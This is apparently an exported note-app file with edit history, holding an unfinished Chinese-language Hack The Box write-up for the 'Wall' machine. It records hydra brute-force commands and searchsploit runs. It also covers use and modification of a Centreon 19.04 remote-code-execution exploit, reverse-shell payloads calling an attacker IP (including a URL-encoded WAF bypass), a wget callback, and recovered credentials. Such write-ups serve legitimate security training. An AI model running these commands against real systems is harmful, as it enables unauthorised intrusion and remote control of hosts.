/usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历\n",[[1572853226620,["whale@Whale",[[1,159,"\n"]],[158,158],[159,159]]],[1572853234231,["whale@Whale",[[1,159,"https://www.cnblogs.com/rainy-shurun/p/5374789.html)）"]],[159,159],[212,212]]],[1572853235659,["whale@Whale",[[-1,210,")）"]],[212,212],[210,210]]],[1572853243565,["whale@Whale",[[1,159,"【】"]],[159,159],[161,161]]],[1572853244437,["whale@Whale",[[-1,159,"【】"]],[161,161],[159,159]]],[1572853245189,["whale@Whale",[[1,159,"{}"]],[159,159],[161,161]]],[1572853245971,["whale@Whale",[[-1,159,"{}"]],[161,161],[159,159]]],[1572853247221,["whale@Whale",[[1,159,"[]("]],[159,159],[162,162]]],[1572853248457,["whale@Whale",[[1,213,")"]],[213,213],[214,214]]],[1572853258840,["whale@Whale",[[1,160,"apache mo"]],[160,160],[169,169]]],[1572853260080,["whale@Whale",[[-1,167,"mo"]],[169,169],[167,167]]],[1572853261714,["whale@Whale",[[1,167,"## Modsecurity"]],[167,167],[181,181]]],[1572853264485,["whale@Whale",[[-1,167,"## "]],[170,170],[167,167]]],[1572853270106,["whale@Whale",[[1,178," waf绕过"]],[178,178],[184,184]]],[1572853276204,["whale@Whale",[[1,27,"\n"]],[27,27],[28,28]]],[1572853277878,["whale@Whale",[[1,28,"- "]],[28,28],[30,30]]],[1572853283645,["whale@Whale",[[1,162,"- "]],[162,162],[164,164]]],[1572853680540,["whale@Whale",[[1,244,"\n"]],[243,243],[244,244]]]]],["d2ff2d31-98c5-4f4c-af50-1fb39c5e1d34",1573268879038,"Wall-10.10.10.157\n===\n参考资料：\n- [http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n- [apache Modsecurity waf绕过](https://www.cnblogs.com/rainy-shurun/p/5374789.html)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\n\n### enumeration\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\nget改post请求，绕过登陆页面。\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\n`python3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330`\n\n执行后报错，于是修改exp。\n\n```\n。。。。。。\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n```\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\n[exp下载地址](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.18 8080\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nnagios_bin参数\n\nhttp://10.10.10.157/centreon/main.get.php?p=60901\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历\n",[[1573268875999,["whale@Whale",[[1,2467,"\n"]],[2466,2466],[2467,2467]]],[1573268876934,["whale@Whale",[[1,2467,"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]],[2467,2467],[2505,2505]]],[1573268878375,["whale@Whale",[[1,2506,"\n"]],[2505,2505],[2506,2506]]],[1573268879399,["whale@Whale",[[1,2467,"\n"]],[2466,2466],[2467,2467]]],[1573268882775,["whale@Whale",[[1,2467,"## r"]],[2467,2467],[2471,2471]]],[1573268883650,["whale@Whale",[[-1,2470,"r"]],[2471,2471],[2470,2470]]],[1573268885867,["whale@Whale",[[1,2470,"绕过waf"]],[2470,2470],[2475,2475]]],[1573268893338,["whale@Whale",[[-1,2480," "],[1,2481,"%"]],[2480,2481],[2481,2481]]],[1573268894969,["whale@Whale",[[-1,2480,"%"]],[2481,2481],[2480,2480]]],[1573268903579,["whale@Whale",[[1,2480,"%20%rs"]],[2480,2480],[2486,2486]]],[1573268904641,["whale@Whale",[[-1,2484,"rs"]],[2486,2486],[2484,2484]]],[1573268906481,["whale@Whale",[[-1,2480,"%"]],[2481,2481],[2480,2480]]],[1573268907708,["whale@Whale",[[1,2480,"%rst"]],[2480,2480],[2484,2484]]],[1573268908673,["whale@Whale",[[-1,2481,"rst"]],[2484,2484],[2481,2481]]],[1573268910706,["whale@Whale",[[-1,2483,"%"]],[2483,2483],[2483,2483]]],[1573268916983,["whale@Whale",[[-1,2485," "]],[2486,2486],[2485,2485]]],[1573268917984,["whale@Whale",[[1,2485,"%20"]],[2485,2485],[2488,2488]]],[1573268920616,["whale@Whale",[[1,2490,"%20"]],[2490,2490],[2493,2493]]],[1573268921721,["whale@Whale",[[-1,2493," "]],[2493,2493],[2493,2493]]],[1573268926489,["whale@Whale",[[-1,2515," "]],[2515,2515],[2515,2515]]],[1573268926826,["whale@Whale",[[1,2515,"%20"]],[2515,2515],[2518,2518]]],[1573268957388,["whale@Whale",[[-1,2505,"0.0."]],[2505,2510],[2506,2506]]],[1573268957978,["whale@Whale",[[1,2506,"0o"]],[2506,2506],[2508,2508]]],[1573268959384,["whale@Whale",[[-1,2507,"o"]],[2508,2508],[2507,2507]]],[1573268961586,["whale@Whale",[[1,2507,".14.18"]],[2507,2507],[2513,2513]]],[1573268986040,["whale@Whale",[[1,2525,"%20"]],[2476,2525],[2528,2528]]],[1573269045023,["whale@Whale",[[-1,2517,"0"]],[2518,2518],[2517,2517]]],[1573269045246,["whale@Whale",[[1,2517,"1"]],[2517,2517],[2518,2518]]],[1573269059778,["whale@Whale",[[1,2437,"1"]],[2437,2437],[2438,2438]]],[1573269076799,["whale@Whale",[[1,2531,"\n"]],[2530,2530],[2531,2531]]],[1573269077319,["whale@Whale",[[1,2531,"python3 centreon-exploit.py http://10.10.10.157/centreon admin passwd1 10.10.14.18 8080"]],[2531,2531],[2618,2618]]],[1573269089249,["whale@Whale",[[-1,2539,"centreon-exploit"],[1,2555,"47069"]],[2539,2558],[2547,2547]]],[1573270356456,["whale@Whale",[[-1,2606,"0"]],[2607,2607],[2606,2606]]],[1573270357122,["whale@Whale",[[1,2606,"1"]],[2606,2606],[2607,2607]]],[1573270357535,["whale@Whale",[[1,2608,"\n"]],[2607,2607],[2608,2608]]],[1573270362286,["whale@Whale",[[1,2588,"or"]],[2588,2588],[2590,2590]]],[1573305179614,["whale@Whale",[[-1,3494,"Cookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n"]],[3493,3655],[3493,3493]]],[1573305187074,["whale@Whale",[[1,3681,"\n![16]($res/16.PNG)\n"]],[3494,3494],[3701,3701]]],[1573305198073,["whale@Whale",[[-1,3682,"![16]($res/16.PNG)"]],[3682,3700],[3682,3682]]],[1573305200724,["whale@Whale",[[1,3494,"![16]($res/16.PNG)"]],[3494,3494],[3512,3512]]],[1573305201840,["whale@Whale",[[1,3513,"\n"]],[3512,3512],[3513,3513]]],[1573305204539,["whale@Whale",[[1,3513,"主义"]],[3513,3513],[3515,3515]]],[1573305205291,["whale@Whale",[[-1,3513,"主义"]],[3515,3515],[3513,3513]]],[1573305210934,["whale@Whale",[[1,3513,"注意图中的testpath"]],[3513,3513],[3526,3526]]],[1573305211551,["whale@Whale",[[1,3527,"\n"]],[3526,3526],[3527,3527]]],[1573305566549,["whale@Whale",[[1,3224,"## gen"]],[3224,3224],[3230,3230]]],[1573305567177,["whale@Whale",[[-1,3227,"gen"]],[3230,3230],[3227,3227]]],[1573305577654,["whale@Whale",[[1,3227,"根据python exp手动利用漏洞"]],[3227,3227],[3245,3245]]],[1573305581061,["whale@Whale",[[1,3515,"\n"]],[3514,3514],[3515,3515]]],[1573305584087,["whale@Whale",[[1,3515,"首先访问http://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1"]],[3515,3515],[3580,3580]]],[1573305585349,["whale@Whale",[[1,3581,"\n"]],[3580,3580],[3581,3581]]],[1573305593833,["whale@Whale",[[1,3515,"开启burp,"]],[3515,3515],[3522,3522]]],[1573305595398,["whale@Whale",[[-1,3521,","]],[3522,3522],[3521,3521]]],[1573305596546,["whale@Whale",[[1,3521,"，"]],[3521,3521],[3522,3522]]],[1573305627229,["whale@Whale",[[1,3592,"7]($res/17.PNG)\n\n![1"]],[3588,3588],[3608,3608]]],[1573305676277,["whale@Whale",[[1,331,"\n"]],[330,330],[331,331]]],[1573305677310,["whale@Whale",[[1,331,"·"]],[331,331],[332,332]]],[1573305677964,["whale@Whale",[[-1,331,"·"]],[332,332],[331,331]]],[1573305678800,["whale@Whale",[[1,331,"```"]],[331,331],[334,334]]],[1573305681295,["whale@Whale",[[1,655,"```"]],[655,655],[658,658]]],[1573305704252,["whale@Whale",[[-1,1237,"s....-s...."]],[1238,1248],[1237,1237]]],[1573305708620,["whale@Whale",[[1,1237,"http://10.10.10.157/"]],[1237,1237],[1257,1257]]],[1573305709405,["whale@Whale",[[-1,1257,"\n"]],[1257,1257],[1257,1257]]],[1573305716220,["whale@Whale",[[1,1327,"\n"]],[1326,1326],[1327,1327]]],[1573305717722,["whale@Whale",[[1,1327,"w"]],[1327,1327],[1328,1328]]],[1573305718793,["whale@Whale",[[-1,1327,"w"]],[1328,1328],[1327,1327]]],[1573305719587,["whale@Whale",[[1,1327,"wei"]],[1327,1327],[1330,1330]]],[1573305720307,["whale@Whale",[[-1,1327,"wei"]],[1330,1330],[1327,1327]]],[1573305724952,["whale@Whale",[[1,1327,"未发现目录遍历"]],[1327,1327],[1334,1334]]],[1573305725548,["whale@Whale",[[1,1335,"\n"]],[1334,1334],[1335,1335]]],[1573305726860,["whale@Whale",[[1,1387,"\n"]],[1386,1386],[1387,1387]]],[1573305727541,["whale@Whale",[[-1,1387,"\n"]],[1387,1387],[1386,1386]]],[1573305728420,["whale@Whale",[[1,1373,"\n"]],[1373,1373],[1374,1374]]],[1573305732684,["whale@Whale",[[1,1518,"\n"]],[1518,1518],[1519,1519]]],[1573305733429,["whale@Whale",[[1,1496,"\n"]],[1496,1496],[1497,1497]]],[1573305734085,["whale@Whale",[[1,1497,"\n"]],[1497,1497],[1498,1498]]],[1573305739161,["whale@Whale",[[-1,654,"\n"],[1,655," "]],[634,658],[658,658]]],[1573305740471,["whale@Whale",[[1,654,"\n"],[-1,654," "]],[658,658],[634,658]]],[1573305751039,["whale@Whale",[[-1,1497,"\n"]],[1497,1497],[1496,1496]]],[1573305760896,["whale@Whale",[[-1,2466,"10.10.14.18"],[1,2477,"I"]],[2466,2477],[2466,2467]]],[1573305760963,["whale@Whale",[[1,2467,"P"]],[2466,2467],[2466,2468]]],[1573305856683,["whale@Whale",[[-1,2242,"[exp下载地址](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)"]],[2242,2393],[2242,2242]]],[1573305863091,["whale@Whale",[[1,1751,"\n"]],[1750,1750],[1751,1751]]],[1573305863341,["whale@Whale",[[1,1751,"[exp下载地址](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)"]],[1751,1751],[1902,1902]]],[1573305864379,["whale@Whale",[[1,1903,"\n"]],[1902,1902],[1903,1903]]],[1573305878638,["whale@Whale",[[1,2396,"、、"]],[2396,2396],[2398,2398]]],[1573305879331,["whale@Whale",[[-1,2396,"、、"]],[2398,2398],[2396,2396]]],[1573305879556,["whale@Whale",[[-1,2396,"\n"]],[2396,2396],[2395,2395]]],[1573305880477,["whale@Whale",[[-1,2395,"\n"]],[2395,2395],[2394,2394]]],[1573305885795,["whale@Whale",[[1,2486,"\n"]],[2484,2484],[2485,2485]]],[1573305886259,["whale@Whale",[[1,2487,"\n"]],[2485,2485],[2486,2486]]],[1573305891401,["whale@Whale",[[1,2486,"根据"]],[2486,2486],[2488,2488]]],[1573306152153,["whale@Whale",[[1,3763,"\n"]],[3762,3762],[3763,3763]]],[1573306153280,["whale@Whale",[[1,3763,"··"]],[3763,3763],[3765,3765]]],[1573306154121,["whale@Whale",[[-1,3763,"··"]],[3765,3765],[3763,3763]]],[1573306155058,["whale@Whale",[[1,3763,"```"]],[3763,3763],[3766,3766]]],[1573306157361,["whale@Whale",[[1,4539,"\n"]],[4538,4538],[4539,4539]]],[1573306159426,["whale@Whale",[[-1,4539,"\n"]],[4539,4539],[4538,4538]]],[1573306161454,["whale@Whale",[[1,4572,"```"]],[4572,4572],[4575,4575]]],[1573306164136,["whale@Whale",[[-1,4576,"触及到了防火墙"]],[4576,4583],[4576,4576]]],[1573306164523,["whale@Whale",[[-1,4577,"\n"]],[4576,4576],[4575,4575]]],[1573306165129,["whale@Whale",[[-1,4574,"`"]],[4575,4575],[4574,4574]]],[1573306166574,["whale@Whale",[[1,4574,"`"]],[4574,4574],[4575,4575]]],[1573306186394,["whale@Whale",[[-1,2486,"根据"]],[2486,2488],[2486,2486]]],[1573306186634,["whale@Whale",[[-1,2487,"\n"]],[2486,2486],[2485,2485]]],[1573306186963,["whale@Whale",[[-1,2486,"\n"]],[2485,2485],[2484,2484]]],[1573306196104,["whale@Whale",[[-1,2495,"bash%20-i%20>&%20/dev/tcp/10.10.14.18/8081%200>&1%20"]],[2495,2547],[2495,2495]]],[1573306196529,["whale@Whale",[[-1,2496,"\n"]],[2495,2495],[2494,2494]]],[1573306197216,["whale@Whale",[[-1,2493,"f"]],[2494,2494],[2493,2493]]],[1573306198422,["whale@Whale",[[1,2493,"f"]],[2493,2493],[2494,2494]]],[1573306205560,["whale@Whale",[[-1,2656,"2\\. API is never worthless\n3.CVE x2"]],[2656,2691],[2656,2656]]],[1573306205946,["whale@Whale",[[-1,2657,"\n"]],[2656,2656],[2655,2655]]],[1573306207418,["whale@Whale",[[-1,2656,"\n"]],[2656,2656],[2655,2655]]],[1573306207762,["whale@Whale",[[-1,2655,"\n"]],[2655,2655],[2654,2654]]],[1573306208616,["whale@Whale",[[1,2655,"\n"]],[2654,2654],[2655,2655]]],[1573306226669,["whale@Whale",[[-1,3152,"## 根据python exp手动利用漏洞\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\n开启burp，首先访问http://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\n\n![17]($res/17.PNG)\n\n![16]($res/16.PNG)\n注意图中的testpath"]],[3152,3569],[3152,3152]]],[1573306227281,["whale@Whale",[[-1,3153,"\n"]],[3152,3152],[3151,3151]]],[1573306228137,["whale@Whale",[[-1,3148,"---"]],[3151,3151],[3148,3148]]],[1573306228370,["whale@Whale",[[-1,3149,"\n"]],[3148,3148],[3147,3147]]],[1573306228746,["whale@Whale",[[-1,3148,"\n"]],[3147,3147],[3146,3146]]],[1573306235289,["whale@Whale",[[1,4089,"\n"]],[4088,4088],[4089,4089]]],[1573306236051,["whale@Whale",[[-1,4089,"\n"]],[4089,4089],[4088,4088]]],[1573306238153,["whale@Whale",[[1,4100,"\n"]],[4099,4099],[4100,4100]]],[1573306238385,["whale@Whale",[[1,4101,"\n"]],[4100,4100],[4101,4101]]],[1573306238917,["whale@Whale",[[1,4101,"## 根据python exp手动利用漏洞\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\n开启burp，首先访问http://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\n\n![17]($res/17.PNG)\n\n![16]($res/16.PNG)\n注意图中的testpath"]],[4101,4101],[4518,4518]]],[1573306242913,["whale@Whale",[[1,4089,"\n"]],[4088,4088],[4089,4089]]],[1573306243612,["whale@Whale",[[1,4089,"r"]],[4089,4089],[4090,4090]]],[1573306244176,["whale@Whale",[[-1,4089,"r"]],[4090,4090],[4089,4089]]],[1573306250504,["whale@Whale",[[1,4089,"后台弱口令"]],[4089,4089],[4094,4094]]],[1573306257124,["whale@Whale",[[1,4525,"\n"]],[4524,4524],[4525,4525]]],[1573306257329,["whale@Whale",[[1,4526,"\n"]],[4525,4525],[4526,4526]]],[1573306258739,["whale@Whale",[[-1,4526,"\n"],[1,4527,"待续"]],[4526,4526],[4528,4528]]],[1573306277690,["whale@Whale",[[-1,4,"-10.10.10.157"]],[5,17],[4,4]]],[1573306283849,["whale@Whale",[[-1,0,"Wall\n==="]],[5,8],[0,0]]],[1573306286223,["whale@Whale",[[-1,0,"\n"]],[1,1],[0,0]]],[1573306364576,["whale@Whale",[[1,2464,"\n"]],[2463,2463],[2464,2464]]],[1573306367031,["whale@Whale",[[1,2373,"\n"]],[2372,2372],[2373,2373]]],[1573306368150,["whale@Whale",[[1,2373,"xi"]],[2373,2373],[2375,2375]]],[1573306368660,["whale@Whale",[[-1,2373,"xi"]],[2375,2375],[2373,2373]]],[1573306371782,["whale@Whale",[[1,2373,"修改后，"]],[2373,2373],[2377,2377]]],[1573306378021,["whale@Whale",[[-1,2373,"修改后，"]],[2377,2377],[2373,2373]]],[1573306378711,["whale@Whale",[[-1,2373,"\n"]],[2373,2373],[2372,2372]]],[1573306390722,["whale@Whale",[[1,2464,"修改后，无报错的exp地址："]],[2464,2464],[2478,2478]]],[1573306465253,["whale@Whale",[[1,2478,"[https://github.com/Whale3070/ctf-coding/blob/master/47069.py](https://github.com/Whale3070/ctf-coding/blob/master/47069.py)"]],[2478,2478],[2602,2602]]],[1573306466255,["whale@Whale",[[1,2603,"\n"]],[2602,2602],[2603,2603]]],[1573306473599,["whale@Whale",[[1,223,"\n"]],[222,222],[223,223]]],[1573306475262,["whale@Whale",[[1,223,"## "]],[223,223],[226,226]]],[1573306477729,["whale@Whale",[[-1,223,"## "]],[226,226],[223,223]]],[1573306484894,["whale@Whale",[[1,223,"最近太忙了ORZ,"]],[223,223],[232,232]]],[1573306485370,["whale@Whale",[[-1,231,","]],[232,232],[231,231]]],[1573306491852,["whale@Whale",[[1,231,"，这篇没做完"]],[231,231],[237,237]]],[1573306492792,["whale@Whale",[[-1,235,"做完"]],[237,237],[235,235]]]]]]}